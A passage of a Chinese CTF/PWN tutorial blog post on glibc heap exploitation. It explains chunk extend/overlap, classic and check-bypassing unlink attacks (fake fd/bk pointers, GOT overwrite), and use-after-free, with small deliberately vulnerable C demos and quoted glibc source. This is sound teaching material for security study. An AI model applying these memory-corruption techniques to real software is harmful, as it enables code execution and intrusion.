src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A816.png" alt="CTF - PWN_堆相关的漏洞与利用16.png"></p><p>修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0x61</code>（包括了 <code>chunk2</code>、<code>chunk3</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A817.png" alt="CTF - PWN_堆相关的漏洞与利用17.png"></p><p>此时 <code>free</code> 掉 <code>chunk1</code>，则 <code>chunk2</code>、<code>chunk3</code> 也一并被 <code>free</code> 进入 <code>fast bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A818.png" alt="CTF - PWN_堆相关的漏洞与利用18.png"></p><p>在 <code>malloc(0x50)</code> 对 <code>extend</code> 区域重新占位后，其中 <code>0x10</code> 的 <code>fastbin</code> 块依然可以正常的分配和释放：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A819.png" alt="CTF - PWN_堆相关的漏洞与利用19.png"></p><p>此时已经构成 <code>Overlap</code>，通过对 <code>Overlap</code> 的进行操作可以实现 <code>fastbin attack</code></p><hr><h2 id="通过-extend-前向-Overlap"><a href="#通过-extend-前向-Overlap" class="headerlink" title="通过 extend 前向 Overlap"></a>通过 extend 前向 Overlap</h2><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin1</span>    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin1</span>    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin2</span>    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 防止与 top 合并</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>   <span class="token comment">// 修改 pre_inuse 域</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>   <span class="token comment">// 修改 pre_size 域</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// unlink 进行前向 extend</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 占位块</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配五个堆块后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A820.png" alt="CTF - PWN_堆相关的漏洞与利用20.png"></p><p>此时 <code>free</code> 掉 <code>chunk1</code> 使其置入 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A821.png" alt="CTF - PWN_堆相关的漏洞与利用21.png"></p><p>修改 <code>chunk4</code> 的 <code>size</code> 域为 <code>0x90</code>（其中 <code>pre_inuse</code> 位为 0，代表前一个 <code>chunk</code> 空闲）</p><p>修改 <code>pre_size</code> 域为 <code>0xd0</code>（包括了 <code>chunk2</code> 和 <code>chunk3</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A822.png" alt="CTF - PWN_堆相关的漏洞与利用22.png"></p><p>此时 <code>free</code> 掉 <code>chunk4</code>，会导致 <code>chunk2</code> 和 <code>chunk3</code> 也一并被 <code>free</code>，同时与 <code>free</code> 掉 <code>chunk1</code> 后形成的 <code>unsorted bin</code> 合并：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A823.png" alt="CTF - PWN_堆相关的漏洞与利用23.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A824.png" alt="CTF - PWN_堆相关的漏洞与利用24.png"></p><p>在 <code>malloc(0x150)</code> 对 <code>extend</code> 区域重新占位后，就可以得到 <code>chunk1 + chunk2 + chunk3 + chunk4</code> 的堆块</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A825.png" alt="CTF - PWN_堆相关的漏洞与利用25.png"></p><p>前向 <code>extend</code> 利用了 <code>smallbin</code> 的 unlink 机制，通过修改 <code>pre_size</code> 域可以跨越多个 <code>chunk</code> 进行合并实现 <code>Overlap</code></p><hr><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><blockquote><p><code>unlink()</code> 是 Glibc 中的一个宏，其目的是将某一个空闲 <code>chunk</code> 从其所处的 <code>bin</code> 中脱链</p><ul><li>在 <code>malloc_consolidate()</code> 函数中用于将 <code>fast bin</code> 中的空闲 <code>chunk</code> 整理到 <code>unsorted bin</code>  </li><li>在 <code>malloc()</code> 函数中用于将 <code>unsorted bin</code> 中的空闲 <code>chunk</code> 整理到 <code>small bin</code> 或者 <code>large bin</code>，以及在 <code>malloc()</code> 中获得堆空间时，均有可能调用 <code>unlink()</code> 宏</li></ul><p>参考文章：  </p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">Unlink - CTF Wiki</a>  </li><li><a href="https://blog.csdn.net/Morphy_Amo/article/details/122631424">【pwn学习】堆溢出（三）- Unlink和UAF_pwn unlink-CSDN博客</a></li></ol></blockquote><p>在利用 unlink 所造成的漏洞时，其实就是对 <code>chunk</code> 进行内存布局，然后借助 unlink 操作来达成修改指针的效果</p><p><code>unlink()</code> 的大致流程如下：</p><ol><li>首先根据 <code>chunk P</code> 的 <code>fd</code> 和 <code>bk</code> 参数确定 <code>chunk P</code> 在 <code>bin</code> 中的前后 <code>chunk</code> 分别为 <code>FD</code> 和 <code>BK</code></li><li>然后让 <code>chunk FD</code> 的 <code>bk</code> 参数指向 <code>chunk BK</code></li><li>最后让 <code>chunk BK</code> 的 <code>fd</code> 参数指向 <code>chunk FD</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A826.png" alt="CTF - PWN_堆相关的漏洞与利用26.png"></p><hr><h2 id="没有防护的-unlink"><a href="#没有防护的-unlink" class="headerlink" title="没有防护的 unlink"></a>没有防护的 unlink</h2><blockquote><p>这是比较古老的 unlink 利用方法，没有对 <code>chunk</code> 的 <code>size</code> 检查和双向链表检查</p></blockquote><p>Glibc 中没有防护的 <code>unlink()</code> 宏定义：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span></span>    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>   <span class="token comment">//获取显式链表中前一个块 FD      </span>    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>   <span class="token comment">//获取显示链表中后一个块 BK              </span>    FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>  <span class="token comment">//设置FD的后一个块      </span>    BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>  <span class="token comment">//设置BK的前一个块</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设堆内存最初的布局如图（32 位程序）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A827.png" alt="CTF - PWN_堆相关的漏洞与利用27.png"></p><p>上图中有两个物理空间连续的 <code>chunk</code>，分别是 <code>Q</code> 和 <code>Nextchunk</code>，并且 <code>Q</code> 处于使用状态，<code>Nextchunk</code> 处于释放状态</p><p>如果我们通过某种方式（比如：溢出）将 <code>Nextchunk</code> 的 <code>fd</code> 和 <code>bk</code> 指针修改为指定的值，则当我们 <code>free(Q)</code> 时，会发生如下步骤：</p><ol><li>Glibc 判断 <code>chunk Q</code> 是 <code>small chunk</code>  </li><li>判断前向合并，发现前一个 <code>chunk</code> 处于使用状态，不需要前向合并  </li><li>判断后向合并，发现后一个 <code>chunk</code> 处于空闲状态，需要合并  </li><li>继而对 <code>Nextchunk</code> 采取 unlink 操作</li></ol><p>按照前面所提到的 <code>unlink()</code> 的大致流程，可以将该过程总结如下：</p><ol><li><code>FD = P -&gt; fd = target addr - 12</code>  </li><li><code>BK = P -&gt; bk = expect value</code>  </li><li><code>FD -&gt; bk = BK</code>，即：<code>*(target addr - 12 + 12) = BK = expect value</code>  </li><li><code>BK -&gt; fd = FD</code>，即：<code>*(expect value + 8) = FD = target addr - 12</code></li></ol><p>这样一来，我们可以通过 unlink 直接实现任意地址读写的目的，但是还是需要确保 <code>expect value + 8</code> 的地址处具有可写的权限</p><blockquote><p>例如将 <code>target addr</code> 设置为某个 GOT 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值 <code>expect value</code> 处的代码</p><p><strong>需要注意的是，<code>expect value + 8</code> 处的值被破坏了，需要想办法绕过</strong></p></blockquote><hr><h2 id="存在防护的-unlink"><a href="#存在防护的-unlink" class="headerlink" title="存在防护的 unlink"></a>存在防护的 unlink</h2><blockquote><p>目前的 unlink 通常是存在检查的，此时就没有那么简单了</p></blockquote><p>由于 unlink 的危险性，Glibc 添加了一些检测机制，存在防护的 <code>unlink()</code> 宏如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Take a chunk off a bin list */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span><span class="token punctuation">\</span>    <span class="token expression">FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>      </span><span class="token punctuation">\</span>    <span class="token expression">BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>      </span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>      \        BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>size<span class="token punctuation">)</span>      \            <span class="token operator">&amp;&amp;</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      \    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      \<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>      \       <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    \       P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>      \            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      \                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>      \                  FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \                    FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>      \                    FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>      \                    P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                    P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                  <span class="token punctuation">&#125;</span>      \              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \                P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>      \                P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>      \              <span class="token punctuation">&#125;</span>      \          <span class="token punctuation">&#125;</span>      \      <span class="token punctuation">&#125;</span>      \<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，对 <code>fd</code> 和 <code>bk</code> 的检查：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// fd bk</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      \  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果按照没有防护的 unlink 中提到的场景，当前：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">FD <span class="token operator">-></span> bk <span class="token operator">=</span> target addr <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">=</span> target addrBK <span class="token operator">-></span> fd <span class="token operator">=</span> expect value <span class="token operator">+</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但在这种情况下，修改 GOT 表项的方法可能就不可用了</p><p>不过，我们可以通过伪造的方式绕过这个机制：</p><p>首先通过覆盖，将 <code>Nextchunk</code> 的 <code>FD</code> 指针指向 <code>fakeFD</code>，将 <code>Nextchunk</code> 的 <code>BK</code> 指针指向 <code>fakeBK</code></p><p>为了通过验证，需要满足：</p><ul><li><code>fakeFD -&gt; bk == P</code>，即：<code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code>，即：<code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code>，即：<code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code>，即：<code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 <code>fakeFD + 12</code> 和 <code>fakeBK + 8</code> 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>通过这种方式，P 的指针指向了比自己低 12 的地址处</p><blockquote><p>此方法虽然不可以实现任意地址写，但是可以修改指向 <code>chunk</code> 的指针，这样的修改是可以达到一定的效果的</p></blockquote><p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A828.png" alt="CTF - PWN_堆相关的漏洞与利用28.png"></p><p>由于 P 在 unlink 前是指向正确的 <code>chunk</code> 的指针，因此不受如下检测的影响：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>如果我们设置 <code>Nextchunk</code> 的 <code>fd</code> 和 <code>bk</code> 均为 <code>Nextchunk</code> 的地址也是可以绕过上面的检测的</p><p>但是这样不能达到修改指针内容的效果</p></blockquote><hr><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用 unlink 漏洞的条件：</p><ol><li>存在 UAF 漏洞，可修改 <code>free</code> 状态下 <code>small bin</code> 或是 <code>unsorted bin</code> 的 <code>fd</code> 和 <code>bk</code> 指针  </li><li>已知位置存在一个指针指向可进行 UAF 的 <code>chunk</code></li></ol><p>实现的效果：使得已指向存在 UAF 漏洞的 <code>chunk</code> 的指针 <code>ptr</code> 变为 <code>ptr - 0x18</code></p><p>假设指向存在 UAF 漏洞的 <code>chunk</code> 的指针的地址为 <code>ptr</code>，则实现的主要步骤为：</p><ol><li>修改 <code>fd</code> 为 <code>ptr - 0x18</code>  </li><li>修改 <code>bk</code> 为 <code>ptr - 0x10</code>  </li><li>触发 unlink，<code>ptr</code> 处的指针会变为 <code>ptr - 0x18</code></li></ol><hr><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><blockquote><p>Use After Free 简称 UAF，即：释放后使用漏洞，指一个内存块被释放之后再次被使用</p></blockquote><p>对于内存块释放之后的操作，有以下几种情况：</p><ol><li><p><strong>内存块被释放后，其对应的指针被设置为 NULL</strong>，然后再次使用，自然程序会崩溃  </p></li><li><p><strong>内存块被释放后，其对应的指针没有被设置为 NULL</strong>，然后在它下一次被使用之前，<em>没有代码对这块内存块进行修改</em>，那么程序很有可能可以正常运转  </p></li><li><p><strong>内存块被释放后，其对应的指针没有被设置为 NULL</strong>，但是在它下一次使用之前，<em>有代码对这块内存块进行了修改</em>，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题</p></li></ol><p>通常我们所说的 UAF 漏洞对应的就是 2 和 3</p><p>也就是说，<em>UAF 漏洞利用的前提是：内存块被释放后，其对应的指针没有被设置为 NULL</em></p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>myname<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> NAME<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">myprint</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">printmyname</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call print my name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  NAME <span class="token operator">*</span>a<span class="token punctuation">;</span>  a <span class="token operator">=</span> <span class="token punctuation">(</span>NAME <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> func <span class="token operator">=</span> myprint<span class="token punctuation">;</span>  a <span class="token operator">-></span> myname <span class="token operator">=</span> <span class="token string">"I can also use it"</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// free without modify</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"I can also use it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// free with modify</span>  a <span class="token operator">-></span> func <span class="token operator">=</span> printmyname<span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// set NULL</span>  a <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this pogram will crash...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"can not be printed..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A829.png" alt="CTF - PWN_堆相关的漏洞与利用29.png"></p><ul><li><p>即使 <code>free</code> 掉了 <code>chunk a</code>，我们依然可以通过 <code>a -&gt; func(&quot;I can also use it&quot;)</code> 调用 <code>myprint()</code> 打印输出  </p></li><li><p>即使 <code>free</code> 掉了 <code>chunk a</code>，将 <code>a -&gt; func</code> 修改为 <code>printmyname()</code>，也可以正常使用 <code>printf(&quot;call print my name\n&quot;)</code> 功能</p></li><li><p>但是当 <code>chunk a</code> 被置为 NULL 后，<code>a -&gt; func(&quot;can not be printed...&quot;)</code> 便无法使用</p></li></ul><p>接下来，我们通过 GDB 调试分析一下整个过程</p><p>在执行 <code>free(a)</code> 之前，堆布局如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A830.png" alt="CTF - PWN_堆相关的漏洞与利用30.png"></p><p><img 